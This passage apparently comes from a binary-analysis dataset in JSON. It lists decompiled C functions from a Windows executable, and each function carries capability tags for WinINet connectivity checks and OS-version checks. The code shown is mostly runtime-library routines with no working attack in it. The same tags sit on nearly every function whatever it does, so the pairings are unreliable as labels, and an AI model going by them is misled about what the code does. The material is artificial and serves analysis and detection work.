        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00402b21(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint arg_10h_00;\n    code *pcVar2;\n    int32_t arg_10h_01;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00402289(0x56ab70, 0x10);\n    arg_10h_01 = fcn.00403c3d(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n    *(unaff_EBP + -0x1c) = arg_10h_01;\n    iVar3 = fcn.00402ad6();\n    *(iVar3 + 0x18) = *(iVar3 + 0x18) + 1;\n    *(unaff_EBP + -4) = 0;\n    while (arg_10h_01 != *(unaff_EBP + 0x14)) {\n        if ((arg_10h_01 < 0) || (iVar3 = *(unaff_EBP + 0x10),  *(iVar3 + 4) <= arg_10h_01)) goto code_r0x00488bd5;\n        iVar1 = *(iVar3 + 8);\n        arg_10h_00 = *(iVar1 + arg_10h_01 * 8);\n        *(unaff_EBP + -0x20) = arg_10h_00;\n        *(unaff_EBP + -4) = 1;\n        if (*(iVar1 + 4 + arg_10h_01 * 8) != 0) {\n            fcn.00402275(*(unaff_EBP + 8), iVar3, arg_10h_00);\n            fcn.00403ada(*(*(iVar3 + 8) + 4 + arg_10h_01 * 8), *(unaff_EBP + 8), 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        arg_10h_01 = *(unaff_EBP + -0x20);\n        *(unaff_EBP + -0x1c) = arg_10h_01;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00488bc1();\n    if (arg_10h_01 == *(unaff_EBP + 0x14)) {\n        fcn.00402275(*(unaff_EBP + 8), *(unaff_EBP + 0x10), arg_10h_01);\n        *in_FS_OFFSET = *(unaff_EBP + -0x10);\n        return;\n    }\ncode_r0x00488bd5:\n    fcn.00404e94();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 724
    },
    "00402b35": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00402b35(uint noname_0, int32_t arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t *arg_1ch, \n            int32_t *arg_20h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint arg_8h;\n    uint var_44h;\n    uint *var_40h;\n    int32_t var_3ch;\n    uint32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    int32_t *var_2ch;\n    uint *var_28h;\n    uint var_24h;\n    uchar var_5h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    var_30h = arg_10h;\n    var_2ch = arg_20h;\n    if (arg_18h < 10) {\n        iVar4 = 1;\n    }\n    else if (arg_18h < 100) {\n        iVar4 = 2;\n    }\n    else {\n        iVar4 = (999 < arg_18h) + 3;\n    }\n    var_28h = &var_24h;\n    var_34h = iVar4;\n    for (iVar3 = 0; (cVar2 = fcn.00403f7b(var_30h),  cVar2 == '\\0' && (iVar3 < iVar4)); iVar3 = iVar3 + 1) {\n        if (*(arg_ch + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        if ((*(var_2ch[3] + *(arg_ch + 5) * 2) & 0x48) == 0) break;\n        fcn.00401c5d();\n    }\n    arg_8h = var_30h;\n    cVar2 = fcn.00403f7b(var_30h);\n    if (cVar2 != '\\0') goto code_r0x0047e9dd;\n    if (iVar4 <= iVar3) goto code_r0x0047e9dd;\n    if (*(arg_ch + 4) == '\\0') {\n        fcn.004019e7();\n    }\n    var_38h = var_38h & 0xffffff00 | *(arg_ch + 5);\n    pcVar1 = *(*var_2ch + 0x28);\n    (**0x573000)(var_38h, 0);\n    cVar2 = (*pcVar1)();\n    if ((cVar2 != '+') && (cVar2 != '-')) goto code_r0x0047e9dd;\n    var_28h = &var_24h + 1;\n    var_24h._0_1_ = cVar2;\n    while( true ) {\n        fcn.00401c5d();\ncode_r0x0047e9dd:\n        cVar2 = fcn.00403f7b(var_30h);\n        if ((cVar2 != '\\0') || (var_34h <= iVar3)) break;\n        if (*(arg_ch + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        var_38h = var_38h & 0xffffff00 | *(arg_ch + 5);\n        pcVar1 = *(*var_2ch + 0x28);\n        (**0x573000)(var_38h, 0);\n        cVar2 = (*pcVar1)();\n        if (cVar2 != '0') break;\n        iVar3 = iVar3 + 1;\n    }\n    puVar5 = var_28h;\n    if (0 < iVar3) {\n        *var_28h = '0';\n        puVar5 = var_28h + 1;\n        var_28h = puVar5;\n    }\n    while (cVar2 = fcn.00403f7b(var_30h),  cVar2 == '\\0') {\n        if (*(arg_ch + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        var_38h = var_38h & 0xffffff00 | *(arg_ch + 5);\n        pcVar1 = *(*var_2ch + 0x28);\n        (**0x573000)(var_38h, 0);\n        cVar2 = (*pcVar1)();\n        puVar5 = var_28h;\n        if ((9 < cVar2 - 0x30U) || (var_34h <= iVar3)) break;\n        *var_28h = cVar2;\n        if (var_28h < &var_5h) {\n            var_28h = var_28h + 1;\n        }\n        puVar5 = var_28h;\n        iVar3 = iVar3 + 1;\n        fcn.00401c5d();\n    }\n    if (iVar3 == 0) {\n        puVar5 = &var_24h;\n    }\n    *puVar5 = '\\0';\n    var_3ch = 0;\n    iVar4 = fcn.004055b5(&var_24h, &var_40h, 10, &var_3ch);\n    fcn.00403f7b(var_30h);\n    if ((((var_40h != &var_24h) && (var_3ch == 0)) && (arg_14h <= iVar4)) && (iVar4 <= arg_18h)) {\n        *arg_1ch = iVar4;\n    }\n    fcn.00403085(arg_8h);\n    return;\n}\n",
        "token_count": 1298
    },
    "00402b6c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00402b6c(int32_t *param_1, uint param_2)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    int32_t *piVar7;\n    int32_t iVar8;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uchar *puVar9;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint32_t uVar10;\n    int32_t *in_FS_OFFSET;\n    bool bVar11;\n    uint32_t in_stack_ffffffa4;\n    uint in_stack_ffffffa8;\n    uint in_stack_ffffffac;\n    uint in_stack_ffffffb4;\n    uint in_stack_ffffffb8;\n    uint in_stack_ffffffbc;\n    uint in_stack_ffffffc0;\n    uint in_stack_ffffffc4;\n    uint in_stack_ffffffc8;\n    uint in_stack_ffffffcc;\n    uint in_stack_ffffffd0;\n    uint32_t in_stack_ffffffd8;\n    uchar *noname_16;\n    int32_t iVar12;\n    uint noname_18;\n    \n    puVar9 = &stack0xffffffa4;\n    noname_18 = 0x41e260;\n    iVar12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar3 = *param_1;\n    iVar8 = *(iVar3 + 4);\n    piVar7 = *(param_1 + iVar8 + 0x38);\n    piVar4 = param_1;\n    noname_16 = &stack0xffffffa4;\n    if (piVar7 != NULL) {\n        (**(*piVar7 + 4))();\n        iVar3 = *param_1;\n        iVar8 = *(iVar3 + 4);\n        noname_16 = puVar9;\n    }\n    if (*(param_1 + iVar8 + 0xc) == 0) {\n        piVar7 = *(param_1 + iVar8 + 0x3c);\n        if ((piVar7 == NULL) || (piVar7 == param_1)) {\n            uVar6 = CONCAT31(in_stack_ffffffd8 >> 8, 1);\n        }\n        else {\n            fcn.0040303a();\n            iVar3 = *param_1;\n            uVar10 = 0;\n            bVar11 = *(param_1 + *(iVar3 + 4) + 0xc) == 0;\n            uVar6 = in_stack_ffffffd8 & 0xffffff00 | bVar11;\n            puVar9 = &stack0xfffffffc;\n            if (!bVar11) goto code_r0x0041788f;\n        }\n        piVar7 = *(*(param_1 + *(iVar3 + 4) + 0x30) + 4);\n        (**(*piVar7 + 4))();\n        piVar4 = fcn.004053e4(&stack0xffffffac, in_stack_ffffffa4, in_stack_ffffffa8, in_stack_ffffffac, piVar7, \n                              in_stack_ffffffb4, in_stack_ffffffb8, in_stack_ffffffbc, in_stack_ffffffc0, \n                              in_stack_ffffffc4, in_stack_ffffffc8, in_stack_ffffffcc, in_stack_ffffffd0, piVar4, uVar6\n                              , param_1, noname_16, iVar12, noname_18, 4, unaff_ESI, unaff_EDI, unaff_EBX, unaff_EBP);\n        if ((piVar7 != NULL) && (puVar5 = (**(*piVar7 + 8))(),  puVar5 != NULL)) {\n            (***puVar5)(1);\n        }\n        iVar12 = *(*param_1 + 4);\n        (**(*piVar4 + 0x24))\n                  (&stack0xffffffa4, *(param_1 + iVar12 + 0x38) << 0x20, param_1 + iVar12, *(param_1 + iVar12 + 0x40), \n                   param_2);\n        uVar10 = (in_stack_ffffffa4 & 0xff) << 2;\n        puVar9 = &stack0xfffffffc;\n    }\n    else {\n        uVar10 = 0;\n        puVar9 = &stack0xfffffffc;\n    }\ncode_r0x0041788f:\n    while( true ) {\n        iVar12 = *(*param_1 + 4);\n        uVar6 = *(param_1 + iVar12 + 0xc) & 0x17 | uVar10 | (*(param_1 + iVar12 + 0x38) == 0) << 2;\n        *(param_1 + iVar12 + 0xc) = uVar6;\n        if ((uVar6 & *(param_1 + iVar12 + 0x10)) == 0) break;\n        fcn.00404372(puVar9 + -0x3c, 1);\n        *(puVar9 + -0x10) = 3;\n        fcn.00405ed4();\n        *(puVar9 + -0x50) = vtable.std::ios_base::failure.0;\n        fcn.004066d1(puVar9 + -0x50, 0x560cfc);\n        param_1 = *(puVar9 + -0x14);\n        uVar10 = 0;\n        puVar9 = puVar9 + 0xc;\n    }\n    cVar2 = fcn.00402108();\n    if (cVar2 == '\\0') {\n        *(puVar9 + -0x10) = 2;\n        *(puVar9 + -0x2c) = *(puVar9 + -0x28);\n        fcn.00405443();\n        param_1 = *(puVar9 + -0x20);\n        piVar7 = *(puVar9 + -0x2c);\n    }\n    else {\n        piVar7 = *(puVar9 + -0x28);\n    }\n    piVar7 = *(piVar7 + *(*piVar7 + 4) + 0x38);\n    if (piVar7 != NULL) {\n        pcVar1 = *(*piVar7 + 8);\n        *(puVar9 + -0x10) = 1;\n        (*pcVar1)();\n        param_1 = *(puVar9 + -0x20);\n    }\n    *in_FS_OFFSET = *(puVar9 + -0x18);\n    return param_1;\n}\n",
        "token_count": 1474
    },
    "00402b99": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.00402b99(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00402289(0x567340, 8);\n    *(unaff_EBP + -4) = 0;\n    if (((*0x400000 == 0x5a4d) && (*(*0x40003c + 0x400000) == 0x4550)) && (*(*0x40003c + 0x400018) == 0x10b)) {\n        iVar1 = fcn.0045db4c(0x400000, *(unaff_EBP + 8) + -0x400000);\n        if ((iVar1 != 0) && (-1 < *(iVar1 + 0x24))) {\n            *(unaff_EBP + -4) = 0xfffffffe;\n            uVar2 = 1;\n            goto code_r0x0045de97;\n        }\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    uVar2 = 0;\ncode_r0x0045de97:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 323
    },
    "00402c07": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00402c07(uint arg_8h)\n\n{\n    uchar uVar1;\n    \n    if (arg_8h != '\\0') {\n        if (*0x57005c != 0) {\n            fcn.00401f19();\n        }\n        return 1;\n    }\n    uVar1 = fcn.004032ab(0x550698, 0x550718);\n    return uVar1;\n}\n",
        "token_count": 98
    },
    "00402c2f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402c2f(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if (*0x56ec21 != '\\0') {\n        return 1;\n    }\n    if ((arg_8h != 0) && (arg_8h != 1)) {\n        fcn.00403a6c(5);\n        pcVar1 = swi(3);\n        uVar3 = (*pcVar1)();\n        return uVar3;\n    }\n    iVar2 = fcn.004037c9();\n    if ((iVar2 == 0) || (arg_8h != 0)) {\n        *0x56ec24 = 0xffffffff;\n        *0x56ec28 = 0xffffffff;\n        *0x56ec2c = 0xffffffff;\n        *0x56ec30 = 0xffffffff;\n        *0x56ec34 = 0xffffffff;\n        *0x56ec38 = 0xffffffff;\ncode_r0x0045ddde:\n        *0x56ec21 = '\\x01';\n        uVar3 = 1;\n    }\n    else {\n        iVar2 = fcn.00401d3e(0x56ec24);\n        if (iVar2 == 0) {\n            iVar2 = fcn.00401d3e(0x56ec30);\n            if (iVar2 == 0) goto code_r0x0045ddde;\n        }\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 349
    },
    "00402c43": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_64h\n\nuint __cdecl\nfcn.00402c43(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t *var_8h;\n    int32_t var_ch;\n    uint var_1ch;\n    uint var_64h;\n    code *var_30h;\n    code *pcStack48;\n    code *pcStack44;\n    code *pcStack40;\n    code **var_20h;\n    uint *puStack32;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puStack32 = &var_64h;\n    var_10h = 0xffffffff;\n    var_14h = 0x41e480;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    if ((var_8h != NULL) && (*var_8h == 0)) {\n        var_20h = fcn.004024b9(0x18, var_64h);\n        iVar1 = *(var_ch + 4);\n        if (iVar1 == 0) {\n            iVar2 = 0x54018f;\n        }\n        else {\n            iVar2 = iVar1 + 0x1c;\n            if (*(iVar1 + 0x18) != 0) {\n                iVar2 = *(iVar1 + 0x18);\n            }\n        }\n        var_10h = 0;\n        fcn.0040465b(iVar2);\n        var_20h[1] = NULL;\n        *var_20h = vtable.std::ctype_char_.0;\n        var_10h = 1;\n        fcn.00405b05(&var_30h);\n        var_20h[2] = var_30h;\n        var_20h[3] = pcStack48;\n        var_20h[4] = pcStack44;\n        var_20h[5] = pcStack40;\n        *var_8h = var_20h;\n        fcn.00401fb4();\n    }\n    *in_FS_OFFSET = var_18h;\n    return 2;\n}\n",
        "token_count": 660
    },
    "00402c57": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00402c57(void)\n\n{\n    bool bVar1;\n    uint32_t in_MXCSR;\n    uint16_t in_FPUControlWord;\n    float10 in_ST0;\n    float10 in_ST1;\n    \n    if (*0x570754 != 0) {\n        bVar1 = (in_MXCSR & 0x7f80) == 0x1f80;\n        if (bVar1) {\n            bVar1 = (in_FPUControlWord & 0x7f) == 0x7f;\n        }\n        if (bVar1) {\n            fcn.004d34f9(in_ST1, SUB84(in_ST0, 0), in_ST0 >> 0x20);\n            return;\n        }\n    }\n    fcn.004ba12d(SUB84(in_ST1, 0), in_ST1 >> 0x20, in_ST0);\n    return;\n}\n",
        "token_count": 206
    },
    "00402c5c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402c5c(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    uint32_t var_4h;\n    \n    piVar2 = *(in_ECX + 0xc);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.004039a4();\n        *(in_ECX + 0xc) = piVar2;\n    }\n    iVar1 = *piVar2;\n    *piVar2 = 0;\n    var_4h = 0;\n    uVar3 = fcn.00403607(*(in_ECX + 0x10) + -2, &var_4h, 10);\n    *arg_8h = uVar3;\n    piVar4 = *(in_ECX + 0xc);\n    if (piVar4 == NULL) {\n        piVar4 = fcn.004039a4();\n        *(in_ECX + 0xc) = piVar4;\n    }\n    if ((*piVar4 == 0x22) || (var_4h < *(in_ECX + 0x10))) {\n        uVar3 = 0;\n    }\n    else {\n        *(in_ECX + 0x10) = var_4h;\n        uVar3 = 1;\n    }\n    if ((*piVar2 == 0) && (iVar1 != 0)) {\n        *piVar2 = iVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 356
    },
    "00402c98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00402c98(int32_t **arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t **ppiVar3;\n    uint arg_8h_00;\n    uint uVar4;\n    uint var_a4h;\n    uint var_78h;\n    uint var_4ch;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    uint var_1h;\n    \n    uVar4 = *0x56f44c;\n    if ((**0x56f458 == '?') && ((*0x56f458)[1] == '$')) {\n        var_4ch = 0xffffffff;\n        var_78h = 0xffffffff;\n        var_a4h = 0xffffffff;\n        var_14h = *0x56f450;\n        var_18h = *0x56f454;\n        cVar2 = '\\0';\n        *0x56f450 = &var_78h;\n        *0x56f454 = &var_a4h;\n        var_10h = *0x56f44c;\n        var_1h._0_1_ = '\\0';\n        *0x56f44c = &var_4ch;\n        if ((*0x56f458)[2] == '?') {\n            *0x56f458 = *0x56f458 + 3;\n            ppiVar3 = fcn.00402d83(&var_20h, 1, &var_1h);\n            cVar2 = var_1h;\n        }\n        else {\n            *0x56f458 = *0x56f458 + 2;\n            ppiVar3 = fcn.00402919(&var_20h, 1, 1);\n        }\n        var_ch = *ppiVar3;\n        var_8h = ppiVar3[1];\n        if (var_ch == NULL) {\n            *0x56f464 = 1;\n        }\n        if (cVar2 == '\\0') {\n            fcn.00403cba(0x3c);\n            arg_8h_00 = fcn.00403e5e(&var_20h);\n            fcn.00402eb9(arg_8h_00);\n            if (var_ch != NULL) {\n                pcVar1 = *(*var_ch + 8);\n                (**0x573000)();\n                cVar2 = (*pcVar1)();\n                uVar4 = var_10h;\n                if (cVar2 == '>') {\n                    fcn.00403cba(0x20);\n                    uVar4 = var_10h;\n                }\n            }\n            fcn.00403cba(0x3e);\n            if ((arg_ch != '\\0') && (**0x56f458 != '\\0')) {\n                *0x56f458 = *0x56f458 + 1;\n            }\n        }\n        *0x56f450 = var_14h;\n        *0x56f454 = var_18h;\n        *0x56f44c = uVar4;\n        *arg_8h = var_ch;\n        arg_8h[1] = var_8h;\n        return;\n    }\n    arg_8h[1] = NULL;\n    *arg_8h = NULL;\n    *(arg_8h + 1) = 2;\n    return;\n}\n",
        "token_count": 808
    },
    "00402ccf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00402ccf(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint arg_8h, uint arg_ch, uint noname_19, uint noname_20, \n            uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    uint var_40h;\n    uint *var_3ch;\n    uint *var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_40h_2;\n    code *pcStack64;\n    uint32_t uStack60;\n    uint uStack56;\n    uint *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uchar *var_20h_2;\n    int32_t var_1ch_2;\n    uint *var_18h;\n    uint var_14h;\n    code *var_10h;\n    code *var_ch;\n    uint var_8h;\n    code *var_4h;\n    \n    var_20h_2 = &stack0xfffffffc;\n    puStack40 = &stack0xffffffb8;\n    if (var_3ch == 0x123) {\n        *var_38h = 0x4848eb;\n        var_8h = 1;\n    }\n    else {\n        pcStack64 = fcn.00484abb;\n        uStack60 = *0x56cca8 ^ &fcn.00402ccf::var_40h_2;\n        uStack56 = var_2ch;\n        puStack52 = var_38h;\n        uStack48 = var_28h;\n        uStack44 = var_24h;\n        var_1ch_2 = 0;\n        var_40h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.00402ccf::var_40h_2;\n        uVar1 = fcn.004063f7(*var_3ch);\n        *var_3ch = uVar1;\n        var_8h = 1;\n        var_18h = var_3ch;\n        var_14h = var_34h;\n        iVar2 = fcn.00402ad6();\n        var_4h = *(iVar2 + 8);\n        var_ch = *0x573000;\n        (**0x573000)();\n        var_10h = var_4h;\n        (*var_4h)(*var_3ch, &fcn.00402ccf::var_18h);\n        var_8h = 0;\n        if (var_1ch_2 == 0) {\n            *in_FS_OFFSET = var_40h_2;\n        }\n        else {\n            *var_40h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_40h_2;\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 787
    },
    "00402cfc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402cfc(uint *arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    if (0 < arg_8h[1]) {\n        fcn.0040597a(*arg_8h, arg_8h[1]);\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "00402d06": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402d06(ushort *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.0040288d(in_ECX + 0x464 + uVar1 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 300
    },
    "00402d1f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402d1f(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t arg_8h_00;\n    \n    if ((arg_ch == 0) || (arg_8h == NULL)) {\n        arg_ch = 0;\n    }\n    else {\n        arg_8h_00 = *arg_8h;\n        if (arg_8h_00 != arg_ch) {\n            *arg_8h = arg_ch;\n            fcn.00402e9b(arg_ch);\n            if (((arg_8h_00 != 0) && (fcn.0040531c(arg_8h_00),  *(arg_8h_00 + 0xc) == 0)) && (arg_8h_00 != 0x56ce78)) {\n                fcn.00406857(arg_8h_00);\n            }\n        }\n    }\n    return arg_ch;\n}\n",
        "token_count": 211
    },
    "00402d3d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00402d3d(int32_t *param_1)\n\n{\n    uint *puVar1;\n    \n    if (*param_1 == 0) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 85
    },
    "00402d83": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t ** __cdecl fcn.00402d83(int32_t **arg_8h, uint arg_ch, uchar *arg_10h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    code *pcVar3;\n    char cVar4;\n    uint uVar5;\n    int32_t **ppiVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int32_t *piVar9;\n    uint8_t *puVar10;\n    int32_t *piVar11;\n    uint var_28h;\n    char *var_20h;\n    int32_t *var_1ch;\n    int32_t *var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    iVar8 = **0x56f458;\n    puVar10 = *0x56f458 + 1;\n    piVar11 = NULL;\n    var_8h = NULL;\n    piVar9 = NULL;\n    var_4h = NULL;\n    var_18h = NULL;\n    var_14h = NULL;\n    // switch table (22 cases) at 0x48e7aa\n    switch(iVar8) {\n    case 0x4a:\n    case 0x4b:\n    case 0x4c:\n    case 0x4d:\n    case 0x4e:\n    case 0x4f:\n    case 0x50:\n    case 0x51:\n    case 0x52:\n    case 0x53:\n    case 0x54:\n    case 0x55:\n    case 0x56:\n    case 0x57:\n    case 0x58:\n    case 0x59:\n    case 0x5a:\ncode_r0x0048e2d6:\n        iVar8 = **0x56f458 * 8 + 0x54e700;\n        *0x56f458 = puVar10;\ncode_r0x0048e663:\n        fcn.004022a2(iVar8);\n        if (piVar11 == NULL) goto code_r0x0048e27d;\n        piVar9 = var_4h;\n        piVar11 = var_8h;\n        puVar1 = *0x56f458;\n        if (var_8h != NULL) {\n            piVar9 = var_4h | 0x200;\n        }\n        break;\n    case 0x5b:\n    case 0x5c:\n    case 0x5d:\n    case 0x5e:\n        goto code_r0x0048e12f;\n    case 0x5f:\n        iVar8 = *puVar10;\n        puVar1 = *0x56f458 + 2;\n        puVar10 = puVar1;\n    // switch table (24 cases) at 